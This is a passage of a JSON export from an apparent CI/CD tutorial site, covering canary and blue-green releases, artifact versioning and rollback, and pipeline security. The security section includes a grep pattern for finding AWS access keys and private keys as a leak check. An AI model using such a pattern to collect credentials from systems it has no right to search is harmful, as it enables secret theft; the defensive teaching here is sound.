Deployments","u":"https://kubernetes.io/docs/concepts/workloads/controllers/deployment/"},{"t":"Argo Rollouts documentation","u":"https://argo-rollouts.readthedocs.io/en/stable/"},{"t":"Continuous Delivery (Jez Humble and Dave Farley)","u":"https://continuousdelivery.com/"}],"text":"How you put a new version in front of users decides how much risk each release carries. A strategy answers three questions: how much traffic is exposed to the new version, how quickly can you go back, and how much extra capacity does it cost. What you will learn Rolling, blue-green and canary strategies Feature flags and why deploy is not release Safe handling of database changes Automated verification and rollback The strategies Strategy How it works Strength Weakness Recreate Stop the old version, start the new one Simplest Downtime Rolling Replace instances a few at a time No extra capacity, no downtime Old and new run together for a while; slower rollback Blue-green Run the new version beside the old, then switch all traffic Instant switch and instant rollback Double capacity during the switch Canary Send a small share of traffic (say 5%) to the new version, then grow it Limits the damage of a bad release Needs traffic control and good metrics In Kubernetes, a Deployment gives you rolling updates by default. Blue-green is commonly done by running two Deployments and switching a Service selector. Canary needs an ingress or service mesh that can split traffic by weight, or a progressive delivery controller. # Blue-green switch: change which version the Service selects apiVersion: v1 kind: Service metadata: name: shop-api spec: selector: app: shop-api track: green # was: blue ports: - port: 80 targetPort: 8080 A canary needs a decision rule A canary is only as good as the metrics you check. Decide in advance what \"healthy\" means and let automation judge it: Error rate of the canary is no worse than the stable version Latency at the 95th percentile within an agreed margin No increase in crashes or restarts If any check fails, traffic returns to the stable version automatically. Separate deploy from release A feature flag lets you put code into production switched off, then turn it on for a small group, then everyone. Deploying becomes routine and low-risk, and \"release\" becomes a business decision that can be reversed in seconds without redeploying. if flags.is_enabled( \"new-checkout\" , user_id=user. id ): return new_checkout(cart) return old_checkout(cart) Remove flags once a feature is fully released. Old flags become hidden complexity that nobody dares touch. Databases are the hard part Code can be rolled back in seconds; data changes cannot. During a rolling or canary release both versions run against the same database, so every schema change must work with both the old and new code. Use the expand and contract pattern: Expand : add the new column or table (nullable, with no breaking change). Old code ignores it. Migrate : deploy code that writes both and reads the new one; backfill existing data. Contract : after the old version is gone and you are sure you will not roll back, remove the old column in a later release. Never rename or drop a column in the same release that stops using it. Verify and roll back After every deploy, run automated smoke tests against the real environment and watch key metrics for a short bake time. Define the rollback in advance: for Kubernetes, kubectl rollout undo ; for blue-green, switch the selector back; for flags, turn the flag off. A rollback you have never practised is a guess. Incident: a canary takes down checkout Incident A canary at 10% of traffic goes out at 14:00. At 14:06 the checkout error rate rises to 12% for the whole site, not just the canary. Look at what the canary and stable versions have in common: the database. $ kubectl logs deploy/shop-api-canary -n shop -- tail 3 ERROR: column \"currency_code\" of relation \"orders\" does not exist The new code expects a column that the migration has not created in this environment, and a second effect: the canary&#39;s failed requests hold database connections, starving the stable pods. Immediately set the canary weight to zero to stop the damage, which restores service. The lessons are procedural: run the migration (the expand step) as"},"cicd/versioning-and-artifacts":{"html":"\u003cp>The package you test must be the package you deploy. If staging runs one build and production runs another built later from the same source, you have tested something else. Artifacts, versions and promotion rules make releases predictable and reversible.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Build once, promote everywhere\u003c/li>\n\u003cli>Semantic versioning and build metadata\u003c/li>\n\u003cli>Storing artifacts and caching dependencies\u003c/li>\n\u003cli>Changelogs, release notes and rollback\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"build-once-promote-the-artifact\">Build once, promote the artifact\u003c/h2>\n\u003cp>A pipeline should produce an \u003cstrong>immutable artifact\u003c/strong> (a container image, a package, a binary) exactly once. Later stages deploy that same artifact, changing only configuration.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"commit -&gt; build artifact (shop-api:1.8.2-b457) -&gt; test -&gt; staging -&gt; approve -&gt; production\n                              |                                         ^\n                              +--------- same artifact promoted --------+\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">commit -&gt; build artifact (shop-api:1.8.2-b457) -&gt; test -&gt; staging -&gt; approve -&gt; production\n                              |                                         ^\n                              +--------- same artifact promoted --------+\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Environment differences belong in configuration: values, environment variables, secrets and manifests. If you rebuild per environment, a different dependency version or timestamp can sneak in, and &quot;it passed in staging&quot; stops meaning anything.\u003c/p>\n\u003ch2 id=\"semantic-versioning\">Semantic versioning\u003c/h2>\n\u003cp>SemVer uses \u003ccode>MAJOR.MINOR.PATCH\u003c/code>: increase \u003cstrong>MAJOR\u003c/strong> for incompatible changes, \u003cstrong>MINOR\u003c/strong> for backward-compatible features and \u003cstrong>PATCH\u003c/strong> for backward-compatible fixes. Pre-release and build information go after: \u003ccode>2.1.0-rc.1\u003c/code>, \u003ccode>2.1.0+b457\u003c/code>.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"VERSION=$(cat VERSION)\nBUILD=${BUILD_NUMBER:-0}\nTAG=&quot;${VERSION}-b${BUILD}&quot;\necho &quot;building ${TAG}&quot;\ndocker build --build-arg VERSION=&quot;$VERSION&quot; -t registry.example.com/shop/api:&quot;$TAG&quot; .\ndocker push registry.example.com/shop/api:&quot;$TAG&quot;\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>VERSION=$(\u003cspan class=\"hljs-built_in\">cat\u003c/span> VERSION)\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>BUILD=\u003cspan class=\"hljs-variable\">${BUILD_NUMBER:-0}\u003c/span>\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>TAG=\u003cspan class=\"hljs-string\">&quot;\u003cspan class=\"hljs-variable\">${VERSION}\u003c/span>-b\u003cspan class=\"hljs-variable\">${BUILD}\u003c/span>&quot;\u003c/span>\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>\u003cspan class=\"hljs-built_in\">echo\u003c/span> \u003cspan class=\"hljs-string\">&quot;building \u003cspan class=\"hljs-variable\">${TAG}\u003c/span>&quot;\u003c/span>\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>docker build --build-arg VERSION=\u003cspan class=\"hljs-string\">&quot;\u003cspan class=\"hljs-variable\">$VERSION\u003c/span>&quot;\u003c/span> -t registry.example.com/shop/api:\u003cspan class=\"hljs-string\">&quot;\u003cspan class=\"hljs-variable\">$TAG\u003c/span>&quot;\u003c/span> .\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>docker push registry.example.com/shop/api:\u003cspan class=\"hljs-string\">&quot;\u003cspan class=\"hljs-variable\">$TAG\u003c/span>&quot;\u003c/span>\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Services that only talk to your own clients often use a build number or date instead. What matters is that every deployed artifact has a \u003cstrong>unique, traceable identifier\u003c/strong> that maps back to the exact source revision, so you can answer &quot;what is running in production&quot; in seconds.\u003c/p>\n\u003ch2 id=\"recording-what-was-built\">Recording what was built\u003c/h2>\n\u003cp>Store metadata with the artifact: source revision, build number, build time, test results and scan results. Embed the version in the application so it can report it.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"build:\n  script:\n    - docker build -t registry.example.com/shop/api:${BUILD_ID}\n        --label org.opencontainers.image.revision=${SOURCE_REV}\n        --label org.opencontainers.image.version=${VERSION} .\n    - docker push registry.example.com/shop/api:${BUILD_ID}\n  artifacts:\n    paths:\n      - sbom.json\n      - test-report.xml\n    expire_in: 90 days\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">build:\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">docker\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span> \u003cspan class=\"hljs-string\">-t\u003c/span> \u003cspan class=\"hljs-string\">registry.example.com/shop/api:${BUILD_ID}\u003c/span>\n        \u003cspan class=\"hljs-string\">--label\u003c/span> \u003cspan class=\"hljs-string\">org.opencontainers.image.revision=${SOURCE_REV}\u003c/span>\n        \u003cspan class=\"hljs-string\">--label\u003c/span> \u003cspan class=\"hljs-string\">org.opencontainers.image.version=${VERSION}\u003c/span> \u003cspan class=\"hljs-string\">.\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">docker\u003c/span> \u003cspan class=\"hljs-string\">push\u003c/span> \u003cspan class=\"hljs-string\">registry.example.com/shop/api:${BUILD_ID}\u003c/span>\n  \u003cspan class=\"hljs-attr\">artifacts:\u003c/span>\n    \u003cspan class=\"hljs-attr\">paths:\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">sbom.json\u003c/span>\n      \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">test-report.xml\u003c/span>\n    \u003cspan class=\"hljs-attr\">expire_in:\u003c/span> \u003cspan class=\"hljs-number\">90\u003c/span> \u003cspan class=\"hljs-string\">days\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"docker inspect registry.example.com/shop/api:457 --format '{{json .Config.Labels}}'\ncurl -fsS https://shop.example.com/version\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>docker inspect registry.example.com/shop/api:457 --format \u003cspan class=\"hljs-string\">&#x27;{{json .Config.Labels}}&#x27;\u003c/span>\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>curl -fsS https://shop.example.com/version\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A \u003ccode>/version\u003c/code> endpoint, or a metric like \u003ccode>app_build_info{version=&quot;1.8.2&quot;}\u003c/code>, lets monitoring show which version served each request and correlate errors with releases.\u003c/p>\n\u003ch2 id=\"caches-and-artifact-storage\">Caches and artifact storage\u003c/h2>\n\u003cp>Dependency downloads dominate build time. Cache them keyed on the lock file so the cache refreshes only when dependencies change.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"cache:\n  key:\n    files: [requirements.txt]\n  paths:\n    - .cache/pip\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">cache:\u003c/span>\n  \u003cspan class=\"hljs-attr\">key:\u003c/span>\n    \u003cspan class=\"hljs-attr\">files:\u003c/span> [\u003cspan class=\"hljs-string\">requirements.txt\u003c/span>]\n  \u003cspan class=\"hljs-attr\">paths:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">.cache/pip\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Use a proper artifact repository for packages and images, with retention rules. Keep release artifacts long enough to roll back and to satisfy audit needs, and delete short-lived branch builds quickly. Never rely on a build agent&#39;s local disk as the only copy.\u003c/p>\n\u003ch2 id=\"changelog-and-rollback\">Changelog and rollback\u003c/h2>\n\u003cp>Automate release notes from the changes included, and require a rollback plan for risky ones. The simplest rollback is redeploying the previous artifact, which is only possible if:\u003c/p>\n\u003cul>\n\u003cli>the previous artifact still exists in the registry\u003c/li>\n\u003cli>database changes were backward compatible (expand, then contract)\u003c/li>\n\u003cli>configuration for the old version is still available\u003c/li>\n\u003c/ul>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl rollout history deployment/shop-api -n shop\nkubectl rollout undo deployment/shop-api -n shop --to-revision=12\nkubectl rollout status deployment/shop-api -n shop\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl rollout \u003cspan class=\"hljs-built_in\">history\u003c/span> deployment/shop-api -n shop\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl rollout undo deployment/shop-api -n shop --to-revision=12\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl rollout status deployment/shop-api -n shop\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"incident-nobody-knows-what-is-in-production\">Incident: nobody knows what is in production\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A customer reports a bug that was fixed last week. Support says the fix is released. Engineers cannot tell whether production runs the fix because images are tagged \u003ccode>prod\u003c/code> and the pipeline rebuilt from the main branch during the last deployment.\u003c/p>\n\u003c/aside>\n\u003cp>Without a unique version on the running artifact there is no way to answer. The recovery path and prevention:\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl get deploy shop-api -n shop -o jsonpath='{.spec.template.spec.containers[0].image}'\nkubectl get pods -n shop -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl get deploy shop-api -n shop -o jsonpath=\u003cspan class=\"hljs-string\">&#x27;{.spec.template.spec.containers[0].image}&#x27;\u003c/span>\u003c/span>\u003cspan class=\"ln out\">registry.example.com/shop/api:prod\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl get pods -n shop -o jsonpath=\u003cspan class=\"hljs-string\">&#x27;{.items[0].status.containerStatuses[0].imageID}&#x27;\u003c/span>\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Resolve the digest to a build, then to a source revision via the labels. From now on, tag with a unique build identifier, never rebuild for promotion, and surface the version in the UI footer and metrics.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Rebuilding the artifact for each environment\u003c/li>\n\u003cli>Mutable tags such as \u003ccode>prod\u003c/code> or \u003ccode>latest\u003c/code> as release identifiers\u003c/li>\n\u003cli>Cleaning up old artifacts so a rollback is impossible\u003c/li>\n\u003cli>Breaking database compatibility so the previous version cannot run\u003c/li>\n\u003cli>Keeping the only copy of an artifact on a build agent\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"build-once-promote-the-artifact","text":"Build once, promote the artifact"},{"id":"semantic-versioning","text":"Semantic versioning"},{"id":"recording-what-was-built","text":"Recording what was built"},{"id":"caches-and-artifact-storage","text":"Caches and artifact storage"},{"id":"changelog-and-rollback","text":"Changelog and rollback"},{"id":"incident-nobody-knows-what-is-in-production","text":"Incident: nobody knows what is in production"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Semantic Versioning 2.0.0","u":"https://semver.org/"},{"t":"Keep a Changelog","u":"https://keepachangelog.com/en/1.1.0/"},{"t":"DORA research and metrics","u":"https://dora.dev/"}],"text":"The package you test must be the package you deploy. If staging runs one build and production runs another built later from the same source, you have tested something else. Artifacts, versions and promotion rules make releases predictable and reversible. What you will learn Build once, promote everywhere Semantic versioning and build metadata Storing artifacts and caching dependencies Changelogs, release notes and rollback Build once, promote the artifact A pipeline should produce an immutable artifact (a container image, a package, a binary) exactly once. Later stages deploy that same artifact, changing only configuration. commit -> build artifact (shop-api:1.8.2-b457) -> test -> staging -> approve -> production | ^ +--------- same artifact promoted --------+ Environment differences belong in configuration: values, environment variables, secrets and manifests. If you rebuild per environment, a different dependency version or timestamp can sneak in, and \"it passed in staging\" stops meaning anything. Semantic versioning SemVer uses MAJOR.MINOR.PATCH : increase MAJOR for incompatible changes, MINOR for backward-compatible features and PATCH for backward-compatible fixes. Pre-release and build information go after: 2.1.0-rc.1 , 2.1.0+b457 . $ VERSION=$( cat VERSION) $ BUILD= ${BUILD_NUMBER:-0} $ TAG= \" ${VERSION} -b ${BUILD} \" $ echo \"building ${TAG} \" $ docker build --build-arg VERSION= \" $VERSION \" -t registry.example.com/shop/api: \" $TAG \" . $ docker push registry.example.com/shop/api: \" $TAG \" Services that only talk to your own clients often use a build number or date instead. What matters is that every deployed artifact has a unique, traceable identifier that maps back to the exact source revision, so you can answer \"what is running in production\" in seconds. Recording what was built Store metadata with the artifact: source revision, build number, build time, test results and scan results. Embed the version in the application so it can report it. build: script: - docker build -t registry.example.com/shop/api:${BUILD_ID} --label org.opencontainers.image.revision=${SOURCE_REV} --label org.opencontainers.image.version=${VERSION} . - docker push registry.example.com/shop/api:${BUILD_ID} artifacts: paths: - sbom.json - test-report.xml expire_in: 90 days $ docker inspect registry.example.com/shop/api:457 --format &#x27;{{json .Config.Labels}}&#x27; $ curl -fsS https://shop.example.com/version A /version endpoint, or a metric like app_build_info{version=\"1.8.2\"} , lets monitoring show which version served each request and correlate errors with releases. Caches and artifact storage Dependency downloads dominate build time. Cache them keyed on the lock file so the cache refreshes only when dependencies change. cache: key: files: [ requirements.txt ] paths: - .cache/pip Use a proper artifact repository for packages and images, with retention rules. Keep release artifacts long enough to roll back and to satisfy audit needs, and delete short-lived branch builds quickly. Never rely on a build agent&#39;s local disk as the only copy. Changelog and rollback Automate release notes from the changes included, and require a rollback plan for risky ones. The simplest rollback is redeploying the previous artifact, which is only possible if: the previous artifact still exists in the registry database changes were backward compatible (expand, then contract) configuration for the old version is still available $ kubectl rollout history deployment/shop-api -n shop $ kubectl rollout undo deployment/shop-api -n shop --to-revision=12 $ kubectl rollout status deployment/shop-api -n shop Incident: nobody knows what is in production Incident A customer reports a bug that was fixed last week. Support says the fix is released. Engineers cannot tell whether production runs the fix because images are tagged prod and the pipeline rebuilt from the main branch during the last deployment. Without a unique version on the running artifact there is no way to answer"},"cicd/pipeline-security":{"html":"\u003cp>A pipeline has the keys to production: it can read your source, build what you run and deploy it. That makes it one of the most attractive targets in your company. Attackers who compromise a pipeline do not need to break production, because the pipeline will deploy their code for them.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Handling secrets without exposing them in logs or code\u003c/li>\n\u003cli>Isolating and hardening build runners\u003c/li>\n\u003cli>Granting deploy credentials with least privilege and short lifetimes\u003c/li>\n\u003cli>Scanning code, dependencies and images, and pinning what you consume\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"secrets-in-pipelines\">Secrets in pipelines\u003c/h2>\n\u003cp>Secrets must come from a secret store or the CI system&#39;s protected variables, be masked in logs and be scoped to the jobs that need them.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"deploy-prod:\n  stage: deploy\n  environment: production\n  rules:\n    - if: '$CI_COMMIT_BRANCH == &quot;main&quot;'\n  variables:\n    AWS_ROLE_ARN: &quot;arn:aws:iam::123456789012:role/shop-deploy&quot;\n  id_tokens:\n    CI_JOB_JWT:\n      aud: sts.amazonaws.com\n  script:\n    - aws sts assume-role-with-web-identity --role-arn &quot;$AWS_ROLE_ARN&quot; --role-session-name ci-$BUILD_ID --web-identity-token &quot;$CI_JOB_JWT&quot; --duration-seconds 900\n    - ./deploy.sh\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">deploy-prod:\u003c/span>\n  \u003cspan class=\"hljs-attr\">stage:\u003c/span> \u003cspan class=\"hljs-string\">deploy\u003c/span>\n  \u003cspan class=\"hljs-attr\">environment:\u003c/span> \u003cspan class=\"hljs-string\">production\u003c/span>\n  \u003cspan class=\"hljs-attr\">rules:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">if:\u003c/span> \u003cspan class=\"hljs-string\">&#x27;$CI_COMMIT_BRANCH == &quot;main&quot;&#x27;\u003c/span>\n  \u003cspan class=\"hljs-attr\">variables:\u003c/span>\n    \u003cspan class=\"hljs-attr\">AWS_ROLE_ARN:\u003c/span> \u003cspan class=\"hljs-string\">&quot;arn:aws:iam::123456789012:role/shop-deploy&quot;\u003c/span>\n  \u003cspan class=\"hljs-attr\">id_tokens:\u003c/span>\n    \u003cspan class=\"hljs-attr\">CI_JOB_JWT:\u003c/span>\n      \u003cspan class=\"hljs-attr\">aud:\u003c/span> \u003cspan class=\"hljs-string\">sts.amazonaws.com\u003c/span>\n  \u003cspan class=\"hljs-attr\">script:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">aws\u003c/span> \u003cspan class=\"hljs-string\">sts\u003c/span> \u003cspan class=\"hljs-string\">assume-role-with-web-identity\u003c/span> \u003cspan class=\"hljs-string\">--role-arn\u003c/span> \u003cspan class=\"hljs-string\">&quot;$AWS_ROLE_ARN&quot;\u003c/span> \u003cspan class=\"hljs-string\">--role-session-name\u003c/span> \u003cspan class=\"hljs-string\">ci-$BUILD_ID\u003c/span> \u003cspan class=\"hljs-string\">--web-identity-token\u003c/span> \u003cspan class=\"hljs-string\">&quot;$CI_JOB_JWT&quot;\u003c/span> \u003cspan class=\"hljs-string\">--duration-seconds\u003c/span> \u003cspan class=\"hljs-number\">900\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">./deploy.sh\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The best secret is the one that does not exist. \u003cstrong>Workload identity federation\u003c/strong> (OIDC) lets the pipeline prove who it is to the cloud provider and receive credentials that live for minutes, so there is no stored access key to leak. Where static secrets are unavoidable, restrict them to protected branches, rotate them regularly and never echo them.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"grep -rnE &quot;AKIA[0-9A-Z]{16}|BEGIN (RSA|EC|OPENSSH) PRIVATE KEY&quot; . --include=* -I | head\ndetect-secrets scan --all-files | head -20\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>grep -rnE \u003cspan class=\"hljs-string\">&quot;AKIA[0-9A-Z]{16}|BEGIN (RSA|EC|OPENSSH) PRIVATE KEY&quot;\u003c/span> . --include=* -I | \u003cspan class=\"hljs-built_in\">head\u003c/span>\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>detect-secrets scan --all-files | \u003cspan class=\"hljs-built_in\">head\u003c/span> -20\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Run a secret scanner in the pipeline and as a pre-commit hook. A leaked key must be treated as compromised: revoke it first, then clean the history.\u003c/p>\n\u003ch2 id=\"runners-and-isolation\">Runners and isolation\u003c/h2>\n\u003cp>Build agents run untrusted code, since any pull request may contain a malicious test or build script. Treat them accordingly.\u003c/p>\n\u003cul>\n\u003cli>Use ephemeral runners that are destroyed after each job\u003c/li>\n\u003cli>Give runners no standing access to production networks\u003c/li>\n\u003cli>Separate runners for untrusted contributions from those with deploy credentials\u003c/li>\n\u003cli>Do not run pull request pipelines from forks with secrets available\u003c/li>\n\u003cli>Keep the runner software and base image patched\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"least-privilege-for-deployment\">Least privilege for deployment\u003c/h2>\n\u003cp>The deploy job needs permission to update specific workloads, not to administer the account.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: deployer\n  namespace: shop\nrules:\n  - apiGroups: [&quot;apps&quot;]\n    resources: [&quot;deployments&quot;]\n    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;patch&quot;, &quot;update&quot;]\n  - apiGroups: [&quot;&quot;]\n    resources: [&quot;pods&quot;, &quot;pods/log&quot;]\n    verbs: [&quot;get&quot;, &quot;list&quot;]\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">rbac.authorization.k8s.io/v1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">Role\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">deployer\u003c/span>\n  \u003cspan class=\"hljs-attr\">namespace:\u003c/span> \u003cspan class=\"hljs-string\">shop\u003c/span>\n\u003cspan class=\"hljs-attr\">rules:\u003c/span>\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">apiGroups:\u003c/span> [\u003cspan class=\"hljs-string\">&quot;apps&quot;\u003c/span>]\n    \u003cspan class=\"hljs-attr\">resources:\u003c/span> [\u003cspan class=\"hljs-string\">&quot;deployments&quot;\u003c/span>]\n    \u003cspan class=\"hljs-attr\">verbs:\u003c/span> [\u003cspan class=\"hljs-string\">&quot;get&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;list&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;patch&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;update&quot;\u003c/span>]\n  \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">apiGroups:\u003c/span> [\u003cspan class=\"hljs-string\">&quot;&quot;\u003c/span>]\n    \u003cspan class=\"hljs-attr\">resources:\u003c/span> [\u003cspan class=\"hljs-string\">&quot;pods&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;pods/log&quot;\u003c/span>]\n    \u003cspan class=\"hljs-attr\">verbs:\u003c/span> [\u003cspan class=\"hljs-string\">&quot;get&quot;\u003c/span>, \u003cspan class=\"hljs-string\">&quot;list&quot;\u003c/span>]\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Require approval for production, restrict who can approve, and make the pipeline definition itself reviewable. If anyone can edit the pipeline file in a feature branch and have it run with production credentials, protection of the main branch is meaningless.\u003c/p>\n\u003ch2 id=\"securing-what-you-consume\">Securing what you consume\u003c/h2>\n\u003cp>Dependencies are code you did not write. Attackers publish look-alike package names, take over abandoned packages and add malicious install scripts.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"npm ci --ignore-scripts\npython -m pip install --require-hashes -r requirements.txt\npip-audit -r requirements.txt\nnpm audit --audit-level=high\ntrivy fs --scanners vuln,secret,misconfig .\ntrivy config --severity HIGH,CRITICAL Dockerfile k8s/\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>npm ci --ignore-scripts\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>python -m pip install --require-hashes -r requirements.txt\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>pip-audit -r requirements.txt\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>npm audit --audit-level=high\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>trivy fs --scanners vuln,secret,misconfig .\u003c/span>\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>trivy config --severity HIGH,CRITICAL Dockerfile k8s/\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Use lock files and install exactly what they list. Pull through an internal proxy or mirror. Pin third-party CI plugins and actions to an exact version or digest, because a tag can be moved. Generate an SBOM for every release and sign artifacts so deployment can verify them.\u003c/p>\n\u003ch2 id=\"a-layered-pipeline\">A layered pipeline\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Stage\u003c/th>\n\u003cth>Control\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Commit\u003c/td>\n\u003ctd>Secret scanning, signed commits, branch protection and review\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Build\u003c/td>\n\u003ctd>Ephemeral runner, pinned base images, locked 